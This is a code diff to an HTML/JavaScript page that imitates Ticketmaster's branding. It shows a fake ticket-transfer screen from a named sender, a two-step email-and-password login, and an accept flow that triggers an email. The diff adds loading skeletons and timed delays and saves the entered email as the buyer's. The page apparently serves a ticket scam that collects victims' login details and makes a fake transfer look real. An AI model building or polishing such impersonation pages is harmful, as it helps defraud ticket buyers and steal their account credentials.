@@ -257,72 +257,107 @@
       </div>
     </div>
 
-    <!-- ── Blue Header: Welcome + subtitle ── -->
-    <div style="background:#2563eb;padding:18px 18px 0;">
-      <h1 id="transfer-welcome" style="font-size:30px;font-weight:800;color:#fff;line-height:1.15;margin:0;">Welcome, [buyer name]</h1>
-      <p style="font-size:14px;font-weight:500;color:rgba(255,255,255,0.85);margin-top:6px;line-height:1.5;">Once you accept the transfer, the ticket(s) will be located in your account.</p>
-
-      <!-- ── Full Event Image Card ── -->
-      <div style="margin-top:18px;position:relative;border-radius:0;overflow:hidden;">
-        <!-- Event image -->
-        <img id="transfer-event-img" src="https://images.unsplash.com/photo-1470229722913-7c0e2dbbafd3?w=800&auto=format&fit=crop" alt="Event" style="width:100%;height:220px;object-fit:cover;display:block;" />
-        <!-- Date stamp overlay -->
-        <div id="transfer-event-date" style="position:absolute;bottom:82px;left:0;right:0;padding:4px 14px;background:rgba(0,0,0,0.55);font-size:13px;font-weight:700;color:#fff;letter-spacing:0.3px;">MON • JUN 22, 2026 • 12:00 PM</div>
-        <!-- Dark bottom bar: title + count -->
-        <div style="background:#111;padding:14px 14px 12px;display:flex;align-items:flex-start;justify-content:space-between;gap:10px;">
-          <span id="transfer-event-title" style="font-size:18px;font-weight:800;color:#fff;text-transform:uppercase;line-height:1.2;flex:1;">ARIANA GRANDE - THE ETERNAL SUNSHINE TOUR</span>
-          <div style="display:flex;align-items:center;gap:5px;color:rgba(255,255,255,0.75);flex-shrink:0;margin-top:2px;">
-            <svg width="14" height="14" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1"/></svg>
-            <span id="transfer-seat-count" style="font-size:13px;font-weight:700;">x4</span>
+    <!-- ── Transfer Skeleton (shimmers for 2s before transfer content appears) ── -->
+    <div id="transfer-skeleton" class="w-full flex-1 flex flex-col bg-white animate-pulse select-none">
+      <!-- Blue Header Skeleton -->
+      <div style="background:#2563eb;padding:18px 18px 24px;">
+        <div style="height:32px;width:70%;background:rgba(255,255,255,0.3);border-radius:4px;"></div>
+        <div style="height:16px;width:90%;background:rgba(255,255,255,0.2);margin-top:10px;border-radius:4px;"></div>
+        <!-- Card Skeleton -->
+        <div style="margin-top:18px;border-radius:0;overflow:hidden;background:#3b82f6;">
+          <div style="width:100%;height:220px;background:rgba(255,255,255,0.25);"></div>
+          <div style="background:#111;padding:16px 14px;">
+            <div style="height:20px;width:80%;background:#333;border-radius:3px;"></div>
+            <div style="height:14px;width:40%;background:#222;margin-top:8px;border-radius:3px;"></div>
           </div>
         </div>
-        <!-- Venue row -->
-        <div style="background:#111;padding:0 14px 14px;">
-          <span id="transfer-venue" style="font-size:13px;font-weight:500;color:rgba(255,255,255,0.65);">AT&amp;T Stadium, Texas</span>
+      </div>
+      <!-- Body Skeleton -->
+      <div style="background:#f5f5f5;flex:1;padding:20px 18px;">
+        <div style="background:#fff;padding:20px 18px;">
+          <div style="height:18px;width:65%;background:#e5e7eb;border-radius:3px;"></div>
+          <div style="margin-top:16px;border:1px solid #e5e7eb;padding:16px;display:flex;flex-direction:column;gap:8px;">
+            <div style="height:12px;width:25%;background:#e5e7eb;border-radius:2px;"></div>
+            <div style="height:16px;width:75%;background:#e5e7eb;border-radius:2px;"></div>
+          </div>
+          <div style="margin-top:16px;border:1px solid #e5e7eb;padding:16px;display:flex;flex-direction:column;gap:8px;">
+            <div style="height:12px;width:25%;background:#e5e7eb;border-radius:2px;"></div>
+            <div style="height:16px;width:75%;background:#e5e7eb;border-radius:2px;"></div>
+          </div>
+          <div style="margin-top:20px;height:52px;background:#2563eb;opacity:0.3;border-radius:0;"></div>
         </div>
       </div>
     </div>
 
-    <!-- ── White Card Body ── -->
-    <div style="background:#f5f5f5;flex:1;">
-      <div style="background:#fff;margin:0;padding:20px 18px 24px;">
-        <!-- Sender info -->
-        <p style="font-size:15px;font-weight:700;color:#111;line-height:1.4;">You have received a ticket from <span id="transfer-sender-name">Racheal Jaoquin</span></p>
+    <!-- ── Transfer Content Wrapper ── -->
+    <div id="transfer-content-wrapper" class="w-full flex-1 flex flex-col">
+      <!-- ── Blue Header: Welcome + subtitle ── -->
+      <div style="background:#2563eb;padding:18px 18px 0;">
+        <h1 id="transfer-welcome" style="font-size:30px;font-weight:800;color:#fff;line-height:1.15;margin:0;">Welcome, [buyer name]</h1>
+        <p style="font-size:14px;font-weight:500;color:rgba(255,255,255,0.85);margin-top:6px;line-height:1.5;">Once you accept the transfer, the ticket(s) will be located in your account.</p>
 
-        <!-- Seat rows (dynamically rendered) -->
-        <div id="transfer-seat-rows" style="margin-top:16px;display:flex;flex-direction:column;gap:10px;"></div>
-
-        <!-- Accept & Continue block -->
-        <div style="margin-top:20px;border:1px solid #e5e7eb;padding:16px;background:#fafafa;">
-          <p style="font-size:14px;font-weight:700;color:#111;margin-bottom:12px;">Accept &amp; Continue</p>
-          <label style="display:flex;align-items:flex-start;gap:10px;cursor:pointer;">
-            <input type="checkbox" id="transfer-agree-checkbox" style="margin-top:3px;width:16px;height:16px;accent-color:#2563eb;flex-shrink:0;" />
-            <span style="font-size:13px;font-weight:500;color:#444;line-height:1.6;">
-              I have read and agree to the current <a href="#" style="color:#2563eb;font-weight:600;">Terms of Use</a> and <a href="#" style="color:#2563eb;font-weight:600;">Ticket Transfer Recipient Policy</a>, including the arbitration agreement and class action waiver, updated in August 2025.
-            </span>
-          </label>
-        </div>
-
-        <!-- Buttons -->
-        <div style="margin-top:20px;display:flex;flex-direction:column;gap:12px;">
-          <button onclick="handleAcceptTransfer()" style="width:100%;background:#2563eb;color:#fff;font-size:16px;font-weight:700;padding:16px 0;border:none;cursor:pointer;border-radius:0;">Accept Transfer</button>
-          <button onclick="handleDeclineTransfer()" style="width:100%;background:#fff;color:#111;font-size:16px;font-weight:600;padding:15px 0;border:1px solid #ccc;cursor:pointer;border-radius:0;">No Thanks</button>
+        <!-- ── Full Event Image Card ── -->
+        <div style="margin-top:18px;position:relative;border-radius:0;overflow:hidden;">
+          <!-- Event image -->
+          <img id="transfer-event-img" src="https://images.unsplash.com/photo-1470229722913-7c0e2dbbafd3?w=800&auto=format&fit=crop" alt="Event" style="width:100%;height:220px;object-fit:cover;display:block;" />
+          <!-- Date stamp overlay -->
+          <div id="transfer-event-date" style="position:absolute;bottom:82px;left:0;right:0;padding:4px 14px;background:rgba(0,0,0,0.55);font-size:13px;font-weight:700;color:#fff;letter-spacing:0.3px;">MON • JUN 22, 2026 • 12:00 PM</div>
+          <!-- Dark bottom bar: title + count -->
+          <div style="background:#111;padding:14px 14px 12px;display:flex;align-items:flex-start;justify-content:space-between;gap:10px;">
+            <span id="transfer-event-title" style="font-size:18px;font-weight:800;color:#fff;text-transform:uppercase;line-height:1.2;flex:1;">ARIANA GRANDE - THE ETERNAL SUNSHINE TOUR</span>
+            <div style="display:flex;align-items:center;gap:5px;color:rgba(255,255,255,0.75);flex-shrink:0;margin-top:2px;">
+              <svg width="14" height="14" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1"/></svg>
+              <span id="transfer-seat-count" style="font-size:13px;font-weight:700;">x4</span>
+            </div>
+          </div>
+          <!-- Venue row -->
+          <div style="background:#111;padding:0 14px 14px;">
+            <span id="transfer-venue" style="font-size:13px;font-weight:500;color:rgba(255,255,255,0.65);">AT&amp;T Stadium, Texas</span>
+          </div>
         </div>
       </div>
+
+      <!-- ── White Card Body ── -->
+      <div style="background:#f5f5f5;flex:1;">
+        <div style="background:#fff;margin:0;padding:20px 18px 24px;">
+          <!-- Sender info -->
+          <p style="font-size:15px;font-weight:700;color:#111;line-height:1.4;">You have received a ticket from <span id="transfer-sender-name">Racheal Jaoquin</span></p>
+
+          <!-- Seat rows (dynamically rendered) -->
+          <div id="transfer-seat-rows" style="margin-top:16px;display:flex;flex-direction:column;gap:10px;"></div>
+
+          <!-- Accept & Continue block -->
+          <div style="margin-top:20px;border:1px solid #e5e7eb;padding:16px;background:#fafafa;">
+            <p style="font-size:14px;font-weight:700;color:#111;margin-bottom:12px;">Accept &amp; Continue</p>
+            <label style="display:flex;align-items:flex-start;gap:10px;cursor:pointer;">
+              <input type="checkbox" id="transfer-agree-checkbox" style="margin-top:3px;width:16px;height:16px;accent-color:#2563eb;flex-shrink:0;" />
+              <span style="font-size:13px;font-weight:500;color:#444;line-height:1.6;">
+                I have read and agree to the current <a href="#" style="color:#2563eb;font-weight:600;">Terms of Use</a> and <a href="#" style="color:#2563eb;font-weight:600;">Ticket Transfer Recipient Policy</a>, including the arbitration agreement and class action waiver, updated in August 2025.
+              </span>
+            </label>
+          </div>
+
+          <!-- Buttons -->
+          <div style="margin-top:20px;display:flex;flex-direction:column;gap:12px;">
+            <button onclick="handleAcceptTransfer()" style="width:100%;background:#2563eb;color:#fff;font-size:16px;font-weight:700;padding:16px 0;border:none;cursor:pointer;border-radius:0;">Accept Transfer</button>
+            <button onclick="handleDeclineTransfer()" style="width:100%;background:#fff;color:#111;font-size:16px;font-weight:600;padding:15px 0;border:1px solid #ccc;cursor:pointer;border-radius:0;">No Thanks</button>
+          </div>
+        </div>
+      </div>
+
+      <!-- ── Footer ── -->
+      <footer style="background:#1a1a1a;color:#fff;padding:80px 20px 32px;">
+        <span style="font-family:'Plus Jakarta Sans',sans-serif;font-weight:900;font-size:18px;font-style:italic;letter-spacing:-0.3px;text-transform:lowercase;">ticketmaster<sup style="font-size:7px;font-weight:400;font-style:normal;vertical-align:super;margin-left:1px;">®</sup></span>
+        <p style="font-size:12px;color:rgba(255,255,255,0.55);margin-top:10px;font-weight:600;">Let's connect</p>
+        <div style="display:flex;align-items:center;gap:18px;margin-top:10px;">
+          <svg class="h-5 w-5" style="color:rgba(255,255,255,0.65);" fill="currentColor" viewBox="0 0 24 24"><path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/></svg>
+          <svg class="h-5 w-5" style="color:rgba(255,255,255,0.65);" fill="currentColor" viewBox="0 0 24 24"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-4.714-6.231-5.401 6.231H2.744l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/></svg>
+          <svg class="h-5 w-5" style="color:rgba(255,255,255,0.65);" fill="currentColor" viewBox="0 0 24 24"><path d="M23.495 6.205a3.007 3.007 0 00-2.088-2.088c-1.87-.501-9.396-.501-9.396-.501s-7.507-.01-9.396.501A3.007 3.007 0 00.527 6.205a31.247 31.247 0 00-.522 5.805 31.247 31.247 0 00.522 5.783 3.007 3.007 0 002.088 2.088c1.868.502 9.396.502 9.396.502s7.506 0 9.396-.502a3.007 3.007 0 002.088-2.088 31.247 31.247 0 00.5-5.783 31.247 31.247 0 00-.5-5.805zM9.609 15.601V8.408l6.264 3.602z"/></svg>
+          <svg class="h-5 w-5" style="color:rgba(255,255,255,0.65);" fill="currentColor" viewBox="0 0 24 24"><path d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zM12 0C8.741 0 8.333.014 7.053.072 2.695.272.273 2.69.073 7.052.014 8.333 0 8.741 0 12c0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98C8.333 23.986 8.741 24 12 24c3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98C15.668.014 15.259 0 12 0zm0 5.838a6.162 6.162 0 100 12.324 6.162 6.162 0 000-12.324zM12 16a4 4 0 110-8 4 4 0 010 8zm6.406-11.845a1.44 1.44 0 100 2.881 1.44 1.44 0 000-2.881z"/></svg>
+          <svg class="h-5 w-5" style="color:rgba(255,255,255,0.65);" fill="currentColor" viewBox="0 0 24 24"><path d="M19.59 6.69a4.83 4.83 0 01-3.77-4.25V2h-3.45v13.67a2.89 2.89 0 01-2.88 2.5 2.89 2.89 0 01-2.89-2.89 2.89 2.89 0 012.89-2.89c.28 0 .54.04.79.1V9.01a6.27 6.27 0 00-.79-.05 6.34 6.34 0 00-6.34 6.34 6.34 6.34 0 006.34 6.34 6.34 6.34 0 006.33-6.34V8.69a8.23 8.23 0 004.84 1.56V6.82a4.85 4.85 0 01-1.07-.13z"/></svg>
+        </div>
+      </footer>
     </div>
-
-    <!-- ── Footer ── -->
-    <footer style="background:#1a1a1a;color:#fff;padding:80px 20px 32px;">
-      <span style="font-family:'Plus Jakarta Sans',sans-serif;font-weight:900;font-size:18px;font-style:italic;letter-spacing:-0.3px;text-transform:lowercase;">ticketmaster<sup style="font-size:7px;font-weight:400;font-style:normal;vertical-align:super;margin-left:1px;">®</sup></span>
-      <p style="font-size:12px;color:rgba(255,255,255,0.55);margin-top:10px;font-weight:600;">Let's connect</p>
-      <div style="display:flex;align-items:center;gap:18px;margin-top:10px;">
-        <svg class="h-5 w-5" style="color:rgba(255,255,255,0.65);" fill="currentColor" viewBox="0 0 24 24"><path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/></svg>
-        <svg class="h-5 w-5" style="color:rgba(255,255,255,0.65);" fill="currentColor" viewBox="0 0 24 24"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-4.714-6.231-5.401 6.231H2.744l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/></svg>
-        <svg class="h-5 w-5" style="color:rgba(255,255,255,0.65);" fill="currentColor" viewBox="0 0 24 24"><path d="M23.495 6.205a3.007 3.007 0 00-2.088-2.088c-1.87-.501-9.396-.501-9.396-.501s-7.507-.01-9.396.501A3.007 3.007 0 00.527 6.205a31.247 31.247 0 00-.522 5.805 31.247 31.247 0 00.522 5.783 3.007 3.007 0 002.088 2.088c1.868.502 9.396.502 9.396.502s7.506 0 9.396-.502a3.007 3.007 0 002.088-2.088 31.247 31.247 0 00.5-5.783 31.247 31.247 0 00-.5-5.805zM9.609 15.601V8.408l6.264 3.602z"/></svg>
-        <svg class="h-5 w-5" style="color:rgba(255,255,255,0.65);" fill="currentColor" viewBox="0 0 24 24"><path d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zM12 0C8.741 0 8.333.014 7.053.072 2.695.272.273 2.69.073 7.052.014 8.333 0 8.741 0 12c0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98C8.333 23.986 8.741 24 12 24c3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98C15.668.014 15.259 0 12 0zm0 5.838a6.162 6.162 0 100 12.324 6.162 6.162 0 000-12.324zM12 16a4 4 0 110-8 4 4 0 010 8zm6.406-11.845a1.44 1.44 0 100 2.881 1.44 1.44 0 000-2.881z"/></svg>
-        <svg class="h-5 w-5" style="color:rgba(255,255,255,0.65);" fill="currentColor" viewBox="0 0 24 24"><path d="M19.59 6.69a4.83 4.83 0 01-3.77-4.25V2h-3.45v13.67a2.89 2.89 0 01-2.88 2.5 2.89 2.89 0 01-2.89-2.89 2.89 2.89 0 012.89-2.89c.28 0 .54.04.79.1V9.01a6.27 6.27 0 00-.79-.05 6.34 6.34 0 00-6.34 6.34 6.34 6.34 0 006.34 6.34 6.34 6.34 0 006.33-6.34V8.69a8.23 8.23 0 004.84 1.56V6.82a4.85 4.85 0 01-1.07-.13z"/></svg>
-      </div>
-    </footer>
   </div>
 
   <!-- ================= OVERLAY: SECURING TICKET LOADING ================= -->
@@ -1221,6 +1256,18 @@
       } else if (hash.startsWith('#/transfer')) {
         renderTransferPage();
         showPage(routes.transfer);
+
+        // Show transfer skeleton first for 2 seconds before revealing content
+        const tSkeleton = document.getElementById('transfer-skeleton');
+        const tContent = document.getElementById('transfer-content-wrapper');
+        if (tSkeleton && tContent) {
+          tSkeleton.classList.remove('hidden');
+          tContent.classList.add('hidden');
+          setTimeout(() => {
+            tSkeleton.classList.add('hidden');
+            tContent.classList.remove('hidden');
+          }, 2000);
+        }
       } else if (hash.startsWith('#/login')) {
         showPage(routes.login);
         const loginEmailInput = document.getElementById('login-email');
@@ -1279,7 +1326,7 @@
       }
     }
 
-    // Login Step 1: Email Continue
+    // Login Step 1: Email Continue (loads 2.5s before password page)
     function handleEmailStepSubmit(event) {
       if (event) event.preventDefault();
       const emailInput = document.getElementById('login-email-input');
@@ -1287,7 +1334,22 @@
       // Pass email to password page display
       const displayEl = document.getElementById('login-display-email');
       if (displayEl) displayEl.textContent = emailVal || 'user@domain.com';
-      window.location.hash = '#/login-password';
+      if (activeTicket && emailVal && emailVal.includes('@')) {
+        activeTicket.buyerEmail = emailVal;
+      }
+      
+      const transLoader = document.getElementById('page-transition-loader');
+      if (transLoader) {
+        transLoader.classList.remove('hidden');
+        transLoader.classList.add('flex');
+        setTimeout(() => {
+          transLoader.classList.add('hidden');
+          transLoader.classList.remove('flex');
+          window.location.hash = '#/login-password';
+        }, 2500);
+      } else {
+        window.location.hash = '#/login-password';
+      }
     }
 
     // Login Step 2: Password Sign In → go to Transfer page
@@ -1366,7 +1428,7 @@
 
     // Handle Accept Transfer button
     function handleAcceptTransfer() {
-      // Show securing overlay
+      // Show securing overlay for 3 seconds
       const overlay = document.getElementById('overlay-securing');
       if (overlay) {
         overlay.classList.remove('hidden');
@@ -1383,7 +1445,7 @@
 
         // Trigger email
         if (activeTicket) triggerAcceptanceEmail(activeTicket);
-      }, 2000);
+      }, 3000);
     }
 
     // Dismiss success toast and go to dashboard
